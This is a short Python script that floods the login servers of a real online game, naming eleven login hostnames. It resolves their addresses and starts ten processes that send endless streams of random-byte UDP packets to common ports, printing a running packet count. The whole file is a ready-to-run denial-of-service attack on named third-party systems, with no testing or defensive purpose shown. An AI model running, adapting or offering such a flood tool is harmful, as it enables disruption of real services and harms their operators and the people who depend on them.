import time
import socket
import random
import multiprocessing

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

used_random_ports = [80, 443, 21, 22, 110, 995, 143, 993, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]

port_value = 443
#############
# with open('sites.txt') as f:
#     sites = f.readlines()

sites = [
"login.p1.worldoftanks.net",
"login.p2.worldoftanks.net",
"login.p3.worldoftanks.net",
"login.p4.worldoftanks.net",
"login.p5.worldoftanks.net",
"login.p6.worldoftanks.net",
"login.p7.worldoftanks.net",
"login.p8.worldoftanks.net",
"login.p9.worldoftanks.net",
"login.p10.worldoftanks.net",
"login.p11.worldoftanks.net",
]
ips = []
print("Targeted sites: \n")


def dns_resolve():
    global sent
    for site in sites:
        site = site.replace("http://", "")
        site = site.replace("https://", "")
        site = site.replace(",", "")
        site = site.replace('"', "")
        site = site.replace("'", "")
        site = site.replace("\n", "")
        site = site.replace("\t", "")
        if site[-1] == "/":
            site = site[:-1]
        print('"' + site + '",')
        try:
            ips.append(socket.gethostbyname(site))
        except:
            print(f"Could not resolve:  {site} ")

    port = 1
    sent = 0


def send_packets():
    while True:
        global sent, port_value
        for ip in ips:
            port_value = random.choice(used_random_ports)
            sock.sendto(bytes, (ip, port_value))
            print("Sent {} packets to {} thought port: {} size {}".format(sent, ip, port_value, packet_size))
            sent = sent + 1
            # port = port + 2
            # if port > 65534:
            #     port = 1
            time.sleep(0.001)


dns_resolve()

process_list = []
for i in range(10):
    packet_size = random.randint(10, 20)
    bytes = random._urandom(packet_size)

    p = multiprocessing.Process(target=send_packets)
    p.start()
    process_list.append(p)

for process in process_list:
    process.join()
